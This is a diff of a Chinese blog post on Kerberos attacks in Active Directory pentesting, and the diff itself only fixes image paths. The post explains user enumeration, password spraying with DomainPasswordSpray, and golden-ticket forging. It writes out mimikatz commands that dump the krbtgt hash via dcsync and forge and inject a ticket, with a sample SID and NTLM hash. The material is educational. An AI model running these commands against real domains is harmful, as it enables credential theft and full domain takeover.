@@ -29,32 +29,32 @@
 
 <p>但是不管哪一种攻击都需要被攻击的主机需要开启88端口.</p>
 <p>先把内网的流量转发出来，然后<code>nmap</code>扫描是否打开88端口.</p>
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%5C2.png" alt="image-20200910213758996"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/2.png" alt="image-20200910213758996"></p>
 <p>然后使用<code>msf中的auxiliary/gather/kerberos_enumusers</code>进行攻击</p>
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%5C3.png" alt="image-20200910214250661"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/3.png" alt="image-20200910214250661"></p>
 <p>本质上用户枚举是通过<code>Kerberos</code>错误代码来加以利用</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">KDC_ERR_PREAUTH_REQUIRED 需要额外的预认证 =&gt; 目前/已启用</span><br><span class="line">KDC_ERR_CLIENT_REVOKED 客户端凭证已被吊销 =&gt; 锁定/禁用</span><br><span class="line">KDC_ERR_C_PRINCIPAL_UNKNOWN 在Kerberos数据库中找不到客户端 =&gt; 不存在</span><br></pre></td></tr></table></figure>
 
 
 
 <p>看到如下两种情况:</p>
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%5C4.png" alt="image-20200910214533089"></p>
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%5C5.png" alt="image-20200910214832332"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/4.png" alt="image-20200910214533089"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/5.png" alt="image-20200910214832332"></p>
 <h3 id="密码喷洒攻击"><a href="#密码喷洒攻击" class="headerlink" title="密码喷洒攻击"></a>密码喷洒攻击</h3><p>许多渗透测试人员和攻击者通常都会使用一种被称为“密码喷洒（Password Spraying）”的技术来进行测试和攻击。对密码进行喷洒式的攻击，这个叫法很形象，因为它属于自动化密码猜测的一种。这种针对所有用户的自动密码猜测通常是为了避免帐户被锁定，因为针对同一个用户的连续密码猜测会导致帐户被锁定。所以只有对所有用户同时执行特定的密码登录尝试，才能增加破解的概率，消除帐户被锁定的概率。攻击者首先会从他们已有的密码列表开始尝试，并以最脆弱的密码开始（“Fall2017”，“Winter2018”“123456”等）入手。普通的爆破就是用户名固定，爆破密码，但是密码喷洒，是用固定的密码去跑用户名。</p>
 <p>参考：<a href="https://cloud.tencent.com/developer/article/1333517" target="_blank" rel="noopener">如何通过审计安全事件日志检测密码喷洒(Password Spraying)攻击</a></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\DomainPasswordSpray.ps1</span><br><span class="line">Invoke-DomainPasswordSpray -Password 密码</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%5C7.png" alt="image-20200910232109726"></p>
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%5C6.png" alt="image-20200910232045336"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/7.png" alt="image-20200910232109726"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/6.png" alt="image-20200910232045336"></p>
 <p>利用工具<code>DomainPasswordSpray</code>,对域用户执行密码喷洒攻击。</p>
 <p>PS:在抓包过程中，发现这个攻击手法实际上也不是基于<code>Kerberos</code>协议的，而且<code>LDAP</code>协议在发挥作用，<code>DomainPasswordSpray</code>在默认情况下，将利用<code>LDAP</code>从域中导出用户列表，然后扣掉被锁定的用户，再用固定密码进行密码喷洒。</p>
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%5C8.png" alt="image-20200910234223632"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/8.png" alt="image-20200910234223632"></p>
 <p>从流量可以看到此时正在进行密码喷洒攻击。</p>
 <p>​                                                                                          </p>
 <h2 id="AS-REP"><a href="#AS-REP" class="headerlink" title="AS-REP"></a>AS-REP</h2><p>在<code>AS-REP</code>这个阶段，当某个域用户试图访问域中的某个服务时，输入用户名和密码后，，<code>KDC</code>中的<code>AS-身份认证</code>收到<code>AS-REQ</code>之后将会返回一个<code>AS-REP</code>其中包含的<code>TGT</code>票据，将成为下一阶段重要的认证凭据。此时可能会发生<code>黄金票据攻击</code>，<code>AS-REP Roasting攻击</code></p>
 <h3 id="黄金票据攻击"><a href="#黄金票据攻击" class="headerlink" title="黄金票据攻击"></a>黄金票据攻击</h3><p>在<code>Kerberos</code>协议认证过过程中，<code>KDC</code>返回的<code>AS-REP</code>其中的<code>TGT</code>票据。</p>
 <p>在生成<code>TGT</code>票据的过程中，<code>user,domain,timestamp</code>以及一些权限信息将会经过<code>krbtgt</code>账户hash的加密。所以换言之，如果<code>TGT</code>被伪造，就跳过了<code>AS认证</code>，因为已经有了<code>TGT</code>票据，就可以直接进行第二次认证，就可以和任意的Server进行通信。而伪造的<code>TGT</code>票据就叫做<code>黄金票据</code></p>
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%5C9.png" alt="image-20200911133954249"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/9.png" alt="image-20200911133954249"></p>
 <p><code>KDC</code>返回的<code>AS-REP</code>数据包中有两个部分的数据</p>
 <p>一部分：Client <code>NTLM-Hash</code>加密的<code>Login Session-key</code></p>
 <p>一部分：<code>TGT</code>（<code>krbtgt</code>域账户<code>NTLM-Hash</code>加密的<code>Session-Key as</code>，<code>Client-info</code>，<code>timestamp</code>） </p>
@@ -74,8 +74,8 @@
 <p><strong>获取krbtgt的SID和hash值</strong></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz log <span class="string">"lsadump::dcsync  /domain:tide.org /user:krbtgt"</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%5C10.png" alt="image-20200911185813035"></p>
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%5C11.png" alt="image-20200911185902476"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/10.png" alt="image-20200911185813035"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/11.png" alt="image-20200911185902476"></p>
 <p>获取到SID和hash</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SID:S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-2952760202</span><span class="number">-1353902439</span><span class="number">-2381784089</span>（后面的<span class="number">502</span>不要了）</span><br><span class="line">Hash NTLM:<span class="number">58e91</span>a5ac358d86513ab224312314061</span><br><span class="line">domain:god.org</span><br></pre></td></tr></table></figure>
 
@@ -86,9 +86,9 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 清除票据缓存</span></span><br><span class="line">kerberos::purge</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 生成票据</span></span><br><span class="line">kerberos::golden /admin:Administrator /domain:god.org /sid:S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-2952760202</span><span class="number">-1353902439</span><span class="number">-2381784089</span> /krbtgt:<span class="number">58e91</span>a5ac358d86513ab224312314061 /ticket:Administrator.kiribi</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 导入票据</span></span><br><span class="line">kerberos::ptt Administrator.kiribi</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 查看票据</span></span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>
 
 <p>在导入票据后，票据将被导入至内存中。</p>
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%5C12.png" alt="image-20200914164822626"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/12.png" alt="image-20200914164822626"></p>
 <p>在导入票据后，可尝试访问域控</p>
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%5C14.png" alt="image-20200914164939393"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/14.png" alt="image-20200914164939393"></p>
 <p>那么其实这么说来，在获得域控后，通过伪造票据实际上，我们可以伪造成任何一个用户，但是一般情况下，我们伪造域控管理员的票据就好了，用于权限提升，权限维持，利用黄金票据做权限维持的杀伤力还是蛮大的。</p>
 <p>参考：<a href="https://www.anquanke.com/post/id/172900#h2-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/172900#h2-5</a></p>
 <h3 id="AS-REP-Roasting攻击"><a href="#AS-REP-Roasting攻击" class="headerlink" title="AS-REP Roasting攻击"></a>AS-REP Roasting攻击</h3><p>这个攻击的局限性实在是太大了，个人认为在实战的过程中，应该可行性，不大吧…..</p>
